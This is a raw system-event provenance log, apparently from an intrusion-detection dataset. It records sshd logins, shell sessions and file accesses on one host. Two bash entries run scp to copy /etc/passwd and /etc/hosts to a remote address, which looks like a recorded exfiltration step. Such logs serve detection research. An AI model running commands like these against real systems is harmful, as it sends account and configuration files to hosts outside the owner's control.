1557861726.605:1773368461,B875ABDA-B005-8342-EF38-BFDA9A9F7A5E:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557861726.557:1773367222,DF1419EF-C9DD-19BD-741B-CF28B0036F5F:xfce4-appfinder,EXECUTE,B875ABDA-B005-8342-EF38-BFDA9A9F7A5E,firefox,ta1-trace-2
1557861726.557:1773367206,8C5FA33C-8376-C9DD-93B4-ADA29E386B49:null,FORK,DF1419EF-C9DD-19BD-741B-CF28B0036F5F,xfce4-appfinder,ta1-trace-2
1557861724.433:1773363706,4821635F-376A-68A8-8E4D-44A29E4FB8F5:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861724.429:1773363566,84F04A7A-BCCA-D312-59EB-78728EF62A92:sshd,CHANGE_PRINCIPAL,4821635F-376A-68A8-8E4D-44A29E4FB8F5,sshd,ta1-trace-2
1557861724.429:1773363565,84F04A7A-BCCA-D312-59EB-78728EF62A92:sshd,CHANGE_PRINCIPAL,84F04A7A-BCCA-D312-59EB-78728EF62A92,sshd,ta1-trace-2
1557861724.429:1773363564,4821635F-376A-68A8-8E4D-44A29E4FB8F5:sshd,CHANGE_PRINCIPAL,84F04A7A-BCCA-D312-59EB-78728EF62A92,sshd,ta1-trace-2
1557861724.425:1773363501,4821635F-376A-68A8-8E4D-44A29E4FB8F5:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861723.321:1773362177,3802EF16-49FD-2FB7-C93B-926FBD944497:scp,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557861722.825:1773361822,E1E7D074-BE3E-F53C-B8A9-3FAC2CF9FF0A:ssh,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861722.825:1773361819,E1E7D074-BE3E-F53C-B8A9-3FAC2CF9FF0A:ssh,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861722.825:1773361816,E1E7D074-BE3E-F53C-B8A9-3FAC2CF9FF0A:ssh,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861722.825:1773361813,E1E7D074-BE3E-F53C-B8A9-3FAC2CF9FF0A:ssh,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861722.825:1773361810,E1E7D074-BE3E-F53C-B8A9-3FAC2CF9FF0A:ssh,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861722.825:1773361807,E1E7D074-BE3E-F53C-B8A9-3FAC2CF9FF0A:ssh,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861722.825:1773361804,E1E7D074-BE3E-F53C-B8A9-3FAC2CF9FF0A:ssh,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861722.821:1773361781,E1E7D074-BE3E-F53C-B8A9-3FAC2CF9FF0A:ssh,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861722.821:1773361686,42F12233-35AB-7F29-C615-98631B9D1293:scp,EXECUTE,E1E7D074-BE3E-F53C-B8A9-3FAC2CF9FF0A,ssh,ta1-trace-2
1557861722.821:1773361677,3802EF16-49FD-2FB7-C93B-926FBD944497:scp,FORK,42F12233-35AB-7F29-C615-98631B9D1293,scp,ta1-trace-2
1557861722.821:1773361670,3802EF16-49FD-2FB7-C93B-926FBD944497:scp,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861722.821:1773361609,5212FFA3-848B-6E4B-2C97-43D89791660C:bash,EXECUTE,3802EF16-49FD-2FB7-C93B-926FBD944497,scp -r /etc/hosts admin@128.55.12.78:./test/,ta1-trace-2
1557861722.821:1773361601,5219A624-BF5B-4E16-FEDE-2E0C6D82BB30:bash,FORK,5212FFA3-848B-6E4B-2C97-43D89791660C,bash,ta1-trace-2
1557861721.717:1773359431,DFCAAEE5-F0F4-1D69-F219-0CA24A4C4032:scp,READ,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861721.173:1773358335,ECBA9B06-20FC-E987-394F-39327AFF231B:ssh,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861721.173:1773358332,ECBA9B06-20FC-E987-394F-39327AFF231B:ssh,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861721.173:1773358329,ECBA9B06-20FC-E987-394F-39327AFF231B:ssh,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861721.173:1773358326,ECBA9B06-20FC-E987-394F-39327AFF231B:ssh,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861721.173:1773358323,ECBA9B06-20FC-E987-394F-39327AFF231B:ssh,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861721.173:1773358320,ECBA9B06-20FC-E987-394F-39327AFF231B:ssh,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861721.173:1773358317,ECBA9B06-20FC-E987-394F-39327AFF231B:ssh,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861721.173:1773358295,ECBA9B06-20FC-E987-394F-39327AFF231B:ssh,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861721.169:1773358199,ED50F4E0-9ABD-4039-5D93-B3350D1AFDB2:scp,EXECUTE,ECBA9B06-20FC-E987-394F-39327AFF231B,ssh,ta1-trace-2
1557861721.169:1773358190,DFCAAEE5-F0F4-1D69-F219-0CA24A4C4032:scp,FORK,ED50F4E0-9ABD-4039-5D93-B3350D1AFDB2,scp,ta1-trace-2
1557861721.169:1773358183,DFCAAEE5-F0F4-1D69-F219-0CA24A4C4032:scp,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861721.169:1773358118,96A7F6CC-B2BC-F710-A991-201676F244A2:bash,EXECUTE,DFCAAEE5-F0F4-1D69-F219-0CA24A4C4032,scp -r /etc/passwd admin@128.55.12.78:./test/,ta1-trace-2
1557861721.169:1773358112,5219A624-BF5B-4E16-FEDE-2E0C6D82BB30:bash,FORK,96A7F6CC-B2BC-F710-A991-201676F244A2,bash,ta1-trace-2
1557861720.997:1773355247,5219A624-BF5B-4E16-FEDE-2E0C6D82BB30:bash,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861720.997:1773355164,FC89CDC4-F062-89D4-189E-EB0CFBEF4DC5:sshd,EXECUTE,5219A624-BF5B-4E16-FEDE-2E0C6D82BB30,bash,ta1-trace-2
1557861720.993:1773355063,674FCCB9-C827-9ABB-F33F-25ABDC0F8E4B:sshd,FORK,FC89CDC4-F062-89D4-189E-EB0CFBEF4DC5,sshd,ta1-trace-2
1557861720.993:1773355017,4821635F-376A-68A8-8E4D-44A29E4FB8F5:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861720.993:1773355011,4821635F-376A-68A8-8E4D-44A29E4FB8F5:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861720.993:1773354991,D227159D-F650-33FE-9976-580D7BFD2239:sshd,CHANGE_PRINCIPAL,674FCCB9-C827-9ABB-F33F-25ABDC0F8E4B,sshd,ta1-trace-2
1557861720.993:1773354969,3D3F5F04-2958-EAA2-3C6B-A2FAF3CBCA32:sshd,CHANGE_PRINCIPAL,D227159D-F650-33FE-9976-580D7BFD2239,sshd,ta1-trace-2
1557861720.993:1773354966,4821635F-376A-68A8-8E4D-44A29E4FB8F5:sshd,FORK,3D3F5F04-2958-EAA2-3C6B-A2FAF3CBCA32,sshd,ta1-trace-2
1557861720.993:1773354957,4821635F-376A-68A8-8E4D-44A29E4FB8F5:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861720.993:1773354921,4821635F-376A-68A8-8E4D-44A29E4FB8F5:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861720.993:1773354918,4821635F-376A-68A8-8E4D-44A29E4FB8F5:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861720.993:1773354915,4821635F-376A-68A8-8E4D-44A29E4FB8F5:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861720.949:1773352822,39FBC034-DF2D-D397-F054-C473283CA945:lsb_release,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861720.937:1773352581,ADF36FB5-7682-A5B0-E9B1-73F13FA274EA:91-release-upgr,EXECUTE,39FBC034-DF2D-D397-F054-C473283CA945,lsb_release,ta1-trace-2
1557861720.937:1773352572,210D25B7-6634-5C21-95EC-89708F8714C6:91-release-upgr,FORK,ADF36FB5-7682-A5B0-E9B1-73F13FA274EA,91-release-upgr,ta1-trace-2
1557861720.937:1773352565,8F1E9796-57E7-5EC6-3A09-D801F3032892:91-release-upgr,FORK,210D25B7-6634-5C21-95EC-89708F8714C6,91-release-upgr,ta1-trace-2
1557861720.937:1773352543,A0980351-AA60-A131-9C36-C787830CB40A:run-parts,EXECUTE,8F1E9796-57E7-5EC6-3A09-D801F3032892,91-release-upgr,ta1-trace-2
1557861720.937:1773352541,F1527878-AF7F-E36E-C436-22543F8E1E38:run-parts,FORK,A0980351-AA60-A131-9C36-C787830CB40A,run-parts,ta1-trace-2
1557861720.801:1773344485,2049A4D6-12BB-DB6B-0015-D233187B6419:landscape-sysin,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861720.797:1773344082,214FDD16-4B9A-A2E8-BDAB-25D2979564BB:50-landscape-sy,EXECUTE,2049A4D6-12BB-DB6B-0015-D233187B6419,landscape-sysin,ta1-trace-2
1557861720.797:1773344075,C69FC541-886D-AAB0-030D-A4F46360D4E4:50-landscape-sy,FORK,214FDD16-4B9A-A2E8-BDAB-25D2979564BB,50-landscape-sy,ta1-trace-2
1557861720.793:1773343815,FB8E3113-1FEF-B679-6F1D-A633CEE1BDBC:run-parts,EXECUTE,C69FC541-886D-AAB0-030D-A4F46360D4E4,50-landscape-sy,ta1-trace-2
1557861720.793:1773343814,F1527878-AF7F-E36E-C436-22543F8E1E38:run-parts,FORK,FB8E3113-1FEF-B679-6F1D-A633CEE1BDBC,run-parts,ta1-trace-2
1557861720.789:1773343483,1A8971EC-1615-CDEC-8816-852DDBE7BDCF:env,EXECUTE,F1527878-AF7F-E36E-C436-22543F8E1E38,run-parts,ta1-trace-2
1557861720.789:1773343445,BAE735E0-31FE-B1C0-B154-E283DC30C413:sh,EXECUTE,1A8971EC-1615-CDEC-8816-852DDBE7BDCF,env,ta1-trace-2
1557861720.789:1773343428,BA3E3105-9D8E-7A27-8BB1-223269F6589B:sh,FORK,BAE735E0-31FE-B1C0-B154-E283DC30C413,sh,ta1-trace-2
1557861720.789:1773343389,4C7DA5D3-E716-0B93-144D-FB2940F49202:sshd,EXECUTE,BA3E3105-9D8E-7A27-8BB1-223269F6589B,sh,ta1-trace-2
1557861720.789:1773343332,4821635F-376A-68A8-8E4D-44A29E4FB8F5:sshd,FORK,4C7DA5D3-E716-0B93-144D-FB2940F49202,sshd,ta1-trace-2
1557861720.789:1773343310,4821635F-376A-68A8-8E4D-44A29E4FB8F5:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861720.765:1773343166,4821635F-376A-68A8-8E4D-44A29E4FB8F5:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861720.765:1773343114,4821635F-376A-68A8-8E4D-44A29E4FB8F5:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861720.765:1773343102,DFA69040-5C1C-B235-0468-5588668FBF9F:sshd,CHANGE_PRINCIPAL,4821635F-376A-68A8-8E4D-44A29E4FB8F5,sshd,ta1-trace-2
1557861720.765:1773343101,9948EE54-DA06-589B-F00C-B773A1F91907:sshd,CHANGE_PRINCIPAL,DFA69040-5C1C-B235-0468-5588668FBF9F,sshd,ta1-trace-2
1557861720.765:1773343100,DFA69040-5C1C-B235-0468-5588668FBF9F:sshd,CHANGE_PRINCIPAL,9948EE54-DA06-589B-F00C-B773A1F91907,sshd,ta1-trace-2
1557861720.765:1773343099,4821635F-376A-68A8-8E4D-44A29E4FB8F5:sshd,CHANGE_PRINCIPAL,DFA69040-5C1C-B235-0468-5588668FBF9F,sshd,ta1-trace-2
1557861720.765:1773343097,4821635F-376A-68A8-8E4D-44A29E4FB8F5:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861720.765:1773343083,4821635F-376A-68A8-8E4D-44A29E4FB8F5:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861720.761:1773343042,4821635F-376A-68A8-8E4D-44A29E4FB8F5:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557861720.761:1773343039,4821635F-376A-68A8-8E4D-44A29E4FB8F5:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861720.757:1773343013,4821635F-376A-68A8-8E4D-44A29E4FB8F5:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557861720.757:1773343010,4821635F-376A-68A8-8E4D-44A29E4FB8F5:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861720.653:1773342753,4821635F-376A-68A8-8E4D-44A29E4FB8F5:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861720.653:1773342717,4821635F-376A-68A8-8E4D-44A29E4FB8F5:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557861720.653:1773342716,4821635F-376A-68A8-8E4D-44A29E4FB8F5:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557861720.557:1773342480,4821635F-376A-68A8-8E4D-44A29E4FB8F5:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861720.553:1773342222,1E8CDD7D-6D11-29B0-08E3-57CAE939ECF7:sshd,EXECUTE,4821635F-376A-68A8-8E4D-44A29E4FB8F5,sshd,ta1-trace-2
1557861720.549:1773342197,DEF8FC47-7A9A-FBED-6B2A-08B2189BECCD:sshd,FORK,1E8CDD7D-6D11-29B0-08E3-57CAE939ECF7,sshd,ta1-trace-2
1557861594.107:1773241397,2EC26375-D847-36B4-6529-2C59ECB3AF68:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861594.107:1773241303,2EC26375-D847-36B4-6529-2C59ECB3AF68:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861594.103:1773241241,C545CBC6-8990-519A-20CE-EA64E295D4AD:sshd,CHANGE_PRINCIPAL,2EC26375-D847-36B4-6529-2C59ECB3AF68,sshd,ta1-trace-2
1557861594.103:1773241240,C545CBC6-8990-519A-20CE-EA64E295D4AD:sshd,CHANGE_PRINCIPAL,C545CBC6-8990-519A-20CE-EA64E295D4AD,sshd,ta1-trace-2
1557861594.103:1773241239,2EC26375-D847-36B4-6529-2C59ECB3AF68:sshd,CHANGE_PRINCIPAL,C545CBC6-8990-519A-20CE-EA64E295D4AD,sshd,ta1-trace-2
1557861593.819:1773238283,E6EA5CB9-F422-55D5-3CF6-097095D7E822:bash,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861593.819:1773238200,1E4C36B6-846B-2F87-F2AC-445A9A9E6111:sshd,EXECUTE,E6EA5CB9-F422-55D5-3CF6-097095D7E822,bash,ta1-trace-2
1557861593.819:1773238087,8455AF52-4809-3A90-D699-C950D7D5FF33:sshd,FORK,1E4C36B6-846B-2F87-F2AC-445A9A9E6111,sshd,ta1-trace-2
1557861593.819:1773238041,2EC26375-D847-36B4-6529-2C59ECB3AF68:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861593.819:1773238035,2EC26375-D847-36B4-6529-2C59ECB3AF68:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861593.819:1773238015,3DBD541F-0F59-066A-2511-2D70487BBF31:sshd,CHANGE_PRINCIPAL,8455AF52-4809-3A90-D699-C950D7D5FF33,sshd,ta1-trace-2
1557861593.819:1773237993,6C4BC1B1-12AE-3658-7BD4-6BAA4089A48E:sshd,CHANGE_PRINCIPAL,3DBD541F-0F59-066A-2511-2D70487BBF31,sshd,ta1-trace-2
1557861593.819:1773237990,2EC26375-D847-36B4-6529-2C59ECB3AF68:sshd,FORK,6C4BC1B1-12AE-3658-7BD4-6BAA4089A48E,sshd,ta1-trace-2
1557861593.815:1773237981,2EC26375-D847-36B4-6529-2C59ECB3AF68:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861593.815:1773237942,2EC26375-D847-36B4-6529-2C59ECB3AF68:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861593.815:1773237938,2EC26375-D847-36B4-6529-2C59ECB3AF68:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861593.815:1773237935,2EC26375-D847-36B4-6529-2C59ECB3AF68:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861593.771:1773235859,268BD45B-BC9F-7612-083C-374109840355:lsb_release,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861593.759:1773235632,75680F24-7A49-51C2-B8CB-1221AFE51942:91-release-upgr,EXECUTE,268BD45B-BC9F-7612-083C-374109840355,lsb_release,ta1-trace-2
1557861593.759:1773235606,76541CDB-6BFC-302D-8017-335577C516E2:91-release-upgr,FORK,75680F24-7A49-51C2-B8CB-1221AFE51942,91-release-upgr,ta1-trace-2
1557861593.759:1773235599,FCFAFC81-B219-0C21-BA2E-068D26B9737C:91-release-upgr,FORK,76541CDB-6BFC-302D-8017-335577C516E2,91-release-upgr,ta1-trace-2
1557861593.759:1773235577,2EBB3409-AFCE-3D8C-D728-202C809BA15D:run-parts,EXECUTE,FCFAFC81-B219-0C21-BA2E-068D26B9737C,91-release-upgr,ta1-trace-2
1557861593.759:1773235576,FCDFAF9C-FB29-C6E5-3E90-35BE0E6C2BA5:run-parts,FORK,2EBB3409-AFCE-3D8C-D728-202C809BA15D,run-parts,ta1-trace-2
1557861593.615:1773226784,4F3629B5-11AB-A5DB-155A-1AE0E487969A:landscape-sysin,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861593.611:1773226280,E6C3F26F-8AE4-592C-FF53-4AD3DFA61FA8:50-landscape-sy,EXECUTE,4F3629B5-11AB-A5DB-155A-1AE0E487969A,landscape-sysin,ta1-trace-2
1557861593.611:1773226271,15640295-180C-5B35-5781-3331D3070497:50-landscape-sy,FORK,E6C3F26F-8AE4-592C-FF53-4AD3DFA61FA8,50-landscape-sy,ta1-trace-2
1557861593.607:1773226006,FB298B26-BD90-1B7B-E2B9-7C8EB46AA72B:run-parts,EXECUTE,15640295-180C-5B35-5781-3331D3070497,50-landscape-sy,ta1-trace-2
1557861593.607:1773226005,FCDFAF9C-FB29-C6E5-3E90-35BE0E6C2BA5:run-parts,FORK,FB298B26-BD90-1B7B-E2B9-7C8EB46AA72B,run-parts,ta1-trace-2
1557861593.603:1773225696,4FCC83C1-3B8A-F137-1FA4-96E7BDDC3598:env,EXECUTE,FCDFAF9C-FB29-C6E5-3E90-35BE0E6C2BA5,run-parts,ta1-trace-2
1557861593.603:1773225674,F406CFA7-3192-1FF5-1E63-A346E88324CB:sh,EXECUTE,4FCC83C1-3B8A-F137-1FA4-96E7BDDC3598,env,ta1-trace-2
1557861593.603:1773225666,B65B12BB-EF3D-305A-20BA-500873FEE29B:sh,FORK,F406CFA7-3192-1FF5-1E63-A346E88324CB,sh,ta1-trace-2
1557861593.603:1773225616,8CD645FA-41EA-1A11-70A4-E5403B19B687:sshd,EXECUTE,B65B12BB-EF3D-305A-20BA-500873FEE29B,sh,ta1-trace-2
1557861593.603:1773225505,2EC26375-D847-36B4-6529-2C59ECB3AF68:sshd,FORK,8CD645FA-41EA-1A11-70A4-E5403B19B687,sshd,ta1-trace-2
1557861593.603:1773225487,2EC26375-D847-36B4-6529-2C59ECB3AF68:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861593.587:1773225197,2EC26375-D847-36B4-6529-2C59ECB3AF68:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861593.587:1773225145,2EC26375-D847-36B4-6529-2C59ECB3AF68:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861593.587:1773225133,569327E2-C3DB-71BC-66FD-E6DADB7C3A56:sshd,CHANGE_PRINCIPAL,2EC26375-D847-36B4-6529-2C59ECB3AF68,sshd,ta1-trace-2
1557861593.587:1773225132,CE9FD565-D3A8-38C4-87BF-633DF8429961:sshd,CHANGE_PRINCIPAL,569327E2-C3DB-71BC-66FD-E6DADB7C3A56,sshd,ta1-trace-2
1557861593.587:1773225131,569327E2-C3DB-71BC-66FD-E6DADB7C3A56:sshd,CHANGE_PRINCIPAL,CE9FD565-D3A8-38C4-87BF-633DF8429961,sshd,ta1-trace-2
1557861593.587:1773225130,2EC26375-D847-36B4-6529-2C59ECB3AF68:sshd,CHANGE_PRINCIPAL,569327E2-C3DB-71BC-66FD-E6DADB7C3A56,sshd,ta1-trace-2
1557861593.587:1773225128,2EC26375-D847-36B4-6529-2C59ECB3AF68:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861593.587:1773225114,2EC26375-D847-36B4-6529-2C59ECB3AF68:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861593.587:1773225074,2EC26375-D847-36B4-6529-2C59ECB3AF68:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557861593.587:1773225071,2EC26375-D847-36B4-6529-2C59ECB3AF68:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861593.575:1773225042,2EC26375-D847-36B4-6529-2C59ECB3AF68:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557861593.575:1773225039,2EC26375-D847-36B4-6529-2C59ECB3AF68:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861593.475:1773224781,2EC26375-D847-36B4-6529-2C59ECB3AF68:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861593.475:1773224749,2EC26375-D847-36B4-6529-2C59ECB3AF68:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557861593.475:1773224748,2EC26375-D847-36B4-6529-2C59ECB3AF68:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557861593.391:1773224500,2EC26375-D847-36B4-6529-2C59ECB3AF68:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861593.387:1773224242,6699959D-8488-947F-40B6-5213113E8A6C:sshd,EXECUTE,2EC26375-D847-36B4-6529-2C59ECB3AF68,sshd,ta1-trace-2
1557861593.387:1773224221,DEF8FC47-7A9A-FBED-6B2A-08B2189BECCD:sshd,FORK,6699959D-8488-947F-40B6-5213113E8A6C,sshd,ta1-trace-2
1557861592.699:1773224018,27E9CC16-461D-BD7F-041B-366680BEBA70:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557861587.259:1773218102,B6A08A28-18AD-F6A5-859B-22BC40FC7D23:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861587.259:1773218008,B6A08A28-18AD-F6A5-859B-22BC40FC7D23:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861587.255:1773217923,3C1F37B3-C378-8997-BEEE-B496A1BBB1C6:sshd,CHANGE_PRINCIPAL,B6A08A28-18AD-F6A5-859B-22BC40FC7D23,sshd,ta1-trace-2
1557861587.255:1773217922,3C1F37B3-C378-8997-BEEE-B496A1BBB1C6:sshd,CHANGE_PRINCIPAL,3C1F37B3-C378-8997-BEEE-B496A1BBB1C6,sshd,ta1-trace-2
1557861587.255:1773217921,B6A08A28-18AD-F6A5-859B-22BC40FC7D23:sshd,CHANGE_PRINCIPAL,3C1F37B3-C378-8997-BEEE-B496A1BBB1C6,sshd,ta1-trace-2
1557861586.695:1773162943,27E9CC16-461D-BD7F-041B-366680BEBA70:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557861586.695:1773162942,27E9CC16-461D-BD7F-041B-366680BEBA70:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557861583.803:1772784068,01AA08AE-A99C-791B-B4AF-5E6E42D7E51F:bash,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
1557861583.803:1772783982,CB8A9D98-AB16-182E-A099-042CEBFA726B:sshd,EXECUTE,01AA08AE-A99C-791B-B4AF-5E6E42D7E51F,bash,ta1-trace-2
1557861583.803:1772783875,31B31E8F-D420-8CD3-0738-8CD68FA739A7:sshd,FORK,CB8A9D98-AB16-182E-A099-042CEBFA726B,sshd,ta1-trace-2
1557861583.803:1772783829,B6A08A28-18AD-F6A5-859B-22BC40FC7D23:sshd,MMAP,CB5F0B34-0D6C-3AB5-A558-5298635C1FF4,/etc/passwd,ta1-trace-2
